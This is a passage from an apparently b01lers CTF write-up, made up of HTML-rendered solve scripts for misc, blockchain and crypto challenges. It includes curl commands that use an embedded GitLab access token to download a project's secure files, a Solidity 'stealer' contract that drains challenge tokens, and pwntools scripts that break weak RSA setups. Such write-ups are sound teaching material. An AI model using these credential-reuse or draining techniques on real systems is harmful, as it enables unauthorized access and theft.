style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-string-expression)">"crypto-js"</span><span style="color:var(--astro-code-color-text)">).</span><span style="color:var(--astro-code-token-constant)">enc</span><span style="color:var(--astro-code-color-text)">.Utf8);</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">'bctf{345y-p4s5w0rd->w&#x3C;}'</span></span>
<span class="line"></span></code></pre>
<h2 id="miscb01lersparlay">misc/B01lersParlay</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> git</span><span style="color:var(--astro-code-token-string)"> clone</span><span style="color:var(--astro-code-token-string)"> https://shazly:glpat-R-Td9nSxVAHW-72qxt5M@gitlab.com/b01lersparlay/GenerationalWealth</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> curl</span><span style="color:var(--astro-code-token-string)"> https://shazly:glpat-R-Td9nSxVAHW-72qxt5M@gitlab.com/api/v4/projects/56114917/secure_files?per_page=</span><span style="color:var(--astro-code-token-constant)">100</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> curl</span><span style="color:var(--astro-code-token-string)"> https://shazly:glpat-R-Td9nSxVAHW-72qxt5M@gitlab.com/api/v4/projects/56114917/secure_files/1070175/download</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{ruby_regex_is_goated_gitlab_api_is_cursed_6688}</span></span>
<span class="line"></span></code></pre>
<h2 id="miscbasketball-scholar">misc/basketball-scholar</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> PIL </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> Image</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> numpy </span><span style="color:var(--astro-code-token-keyword)">as</span><span style="color:var(--astro-code-color-text)"> np</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">older </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> Image</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">open</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'orig.jpg'</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">newer </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> Image</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">open</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'pete.png'</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">older </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">(older)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">newer </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">(newer)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">result </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([], dtype</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-punctuation)">np.bool_)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(older.shape[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> j </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(older.shape[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-color-text)"> (older</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">!=</span><span style="color:var(--astro-code-color-text)"> newer</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">or</span><span style="color:var(--astro-code-color-text)"> older</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">!=</span><span style="color:var(--astro-code-color-text)"> newer</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">or</span><span style="color:var(--astro-code-color-text)"> older</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">!=</span><span style="color:var(--astro-code-color-text)"> newer</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-color-text)">])</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">            # print(i, j, older[i][j], newer[i][j], newer[i][j]/older[i][j]==2)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            result </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">append</span><span style="color:var(--astro-code-token-punctuation)">(result, (newer[i][j]</span><span style="color:var(--astro-code-token-keyword)">/</span><span style="color:var(--astro-code-token-punctuation)">older[i][j]</span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">bits </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> ''</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">join</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">list</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">lambda</span><span style="color:var(--astro-code-token-parameter)"> x</span><span style="color:var(--astro-code-token-punctuation)">: </span><span style="color:var(--astro-code-token-string-expression)">'0'</span><span style="color:var(--astro-code-token-keyword)"> if</span><span style="color:var(--astro-code-token-punctuation)"> x </span><span style="color:var(--astro-code-token-keyword)">else</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">list</span><span style="color:var(--astro-code-token-punctuation)">(result))))</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> bits2a</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">b</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    return</span><span style="color:var(--astro-code-token-string-expression)"> ''</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">join</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">chr</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">''</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">join</span><span style="color:var(--astro-code-token-punctuation)">(x), </span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">)) </span><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-token-punctuation)"> x </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> zip</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-token-function)">iter</span><span style="color:var(--astro-code-token-punctuation)">(b)]</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> base64</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(base64.</span><span style="color:var(--astro-code-token-function)">b64decode</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">eval</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">bits2a</span><span style="color:var(--astro-code-token-punctuation)">(bits)).</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">()))</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{Go_b01lerCTFmakers!}</span></span>
<span class="line"></span></code></pre>
<h2 id="blockchainburgercoin">blockchain/burgercoin</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span>contract stealer {</span></span>
<span class="line"><span>    function getToken(address addr) public {</span></span>
<span class="line"><span>        burgercoin b = burgercoin(addr);</span></span>
<span class="line"><span>        b.purchaseBurger();</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    function transferToMyWallet(address addr, address wallet) public {</span></span>
<span class="line"><span>        burgercoin b = burgercoin(addr);</span></span>
<span class="line"><span>        b.transfer(wallet, 1);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>Then we just deploy the <code>stealer</code> contract, call <code>getToken</code> and <code>transferToMyWallet</code> repeatedly until we have 30 burgercoins. We then call <code>transferBurgerjointOwnership</code> using our own wallet and <code>transfer</code> all our coins to another wallet, e.g. the <code>stealer</code> contract. The flag is <code>bctf{you_made_b01lerburgers_go_bankrupt_rip}</code>.</p>
<h2 id="cryptohalf-big-rsa">crypto/half-big-rsa</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> Crypto</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">Util</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">number </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> long_to_bytes</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> math </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> gcd</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">e </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 8190</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">n </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 665515140120452927777672138241759151799589898667434054796291409500701895847040006534274017960741836352283431369658890777476904763064058571375981053480910502427450807868148119447222740298374306206049235106218160749784482387828757815767617741823504974133549502118215185814010416478030136723860862951197024098473528800567738616891653602341160421661595097849964546693006026643728700179973443277934626276981932233698776098859924467510432829393769296526806379126056800758440081227444482951121929701346253100245589361047368821670154633942361108165230244033981429882740588739029933170447051711603248745453079617578876855903762290177883331643511001037754039634053638415842161488684352411211039226087704872112150157895613933727056811203840732191351328849682321511563621522716119495446110146905479764695844458698466998084615534512596477826922686638159998900511018901148179784868970554998882571043992165232556707995154316126421679595109794273650628957795546293370644405017478289280584942868678139801608538607476925924119532501884957937405840470383051787503858934204828174270819328204062103187487600845013162433295862838022726861622054871029319807982173856563380230936757321006235403066943155942418392650327854150659087958008526462507871976852849</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">c </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 264114212766855887600460174907562771340758069941557124363722491581842654823497784410492438939051339540245832405381141754278713030596144467650101730615738854984455449696059994199389876326336906564161058000092717176985620153104965134542134700679600848779222952402880980397293436788260885290623102864133359002377891663502745146147113128504592411055578896628007927185576133566973715082995833415452650323729270592804454136123997392505676446147317372361704725254801818246172431181257019336832814728581055512990705620667354025484563398894047211101124793076391121413112862668719178137133980477637559211419385463448196568615753499719509551081050176747554502163847399479890373976736263256211300138385881514853428005401803323639515624537818822552343927090465091651711036898847540315628282568055822817711675290278630405760056752122426935056309906683423667413310858931246301024309863011027878238814311176040130230980947128260455261157617039938807829728147629666415078365277247086868327600962627944218138488810350881273304037069779619294887634591633069936882854003264469618591009727405143494184122164870065700859379313470866957332849299246770925463579384528152251689152374836955250625216486799615834558624798907067202005564121699019508857929778460</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">K </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> GF</span><span style="color:var(--astro-code-token-punctuation)">(n)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">m </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> K</span><span style="color:var(--astro-code-token-punctuation)">(c).</span><span style="color:var(--astro-code-token-function)">nth_root</span><span style="color:var(--astro-code-token-punctuation)">(e)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">(m))</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{Pr1M3_NUM83r5_4r3_C001_bu7_7H3Y_4r3_57r0N6_0N1Y_WH3N_7H3Y_4r3_MU171P113D_3V3N_1F_7H3Y_4r3_b1g}</span></span>
<span class="line"></span></code></pre>
<h2 id="cryptochoose_the_param">crypto/choose_the_param</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> Crypto</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">Util</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">number </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> long_to_bytes</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># r = process(["python3", "chal.py"])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">5001</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">while</span><span style="color:var(--astro-code-token-constant)"> True</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvuntil</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Enter the bit length of your primes> "</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendline</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"60"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    n </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> int</span><span style="color:var(--astro-code-token-punctuation)">(r.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">" = "</span><span style="color:var(--astro-code-token-punctuation)">)[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], </span><span style="color:var(--astro-code-token-constant)">16</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    e </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> int</span><span style="color:var(--astro-code-token-punctuation)">(r.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">" = "</span><span style="color:var(--astro-code-token-punctuation)">)[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], </span><span style="color:var(--astro-code-token-constant)">16</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    c </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> int</span><span style="color:var(--astro-code-token-punctuation)">(r.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">" = "</span><span style="color:var(--astro-code-token-punctuation)">)[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], </span><span style="color:var(--astro-code-token-constant)">16</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    (p1</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> _)</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> (p2</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> _) </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> factor</span><span style="color:var(--astro-code-token-punctuation)">(n)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    phi </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (p1 </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-color-text)">) </span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)"> (p2 </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    d </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> inverse_mod</span><span style="color:var(--astro-code-token-punctuation)">(e, phi)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    m </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> pow</span><span style="color:var(--astro-code-token-punctuation)">(c, d, n)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> M </span><span style="color:var(--astro-code-token-keyword)">is</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> m</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> n</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        continue</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    M_ </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> crt</span><span style="color:var(--astro-code-token-punctuation)">([M, m], [N, n])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    N_ </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> lcm</span><span style="color:var(--astro-code-token-punctuation)">(N, n)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> M </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-color-text)"> M_</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        break</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> M_</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N_</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">(M))[</span><span style="color:var(--astro-code-token-constant)">200</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)">200</span><span style="color:var(--astro-code-token-punctuation)">].</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{dont_let_the_user_choose_the_prime_length_>w&#x3C;}</span></span>
<span class="line"></span></code></pre>
<h2 id="cryptocount_the_counter">crypto/count_the_counter</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> Crypto</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">Util</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">number </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> bytes_to_long</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># r = process(["python3", "chal.py"])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">5002</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvuntil</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Treat or Trick, count my thing. \n"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">ciphertext </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">send</span><span style="color:var(--astro-code-token-punctuation)">((</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"0"</span><span style="color:var(--astro-code-token-keyword)"> *</span><span style="color:var(--astro-code-token-function)"> len</span><span style="color:var(--astro-code-token-punctuation)">(ciphertext) </span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-token-keyword)"> b</span><span style="color:var(--astro-code-token-string-expression)">"\n"</span><span style="color:var(--astro-code-token-punctuation)">) </span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-punctuation)"> (</span><span style="color:var(--astro-code-token-constant)">257</span><span style="color:var(--astro-code-token-keyword)"> -</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-keyword)"> +</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">))</span></span>
<span class="line"></span>
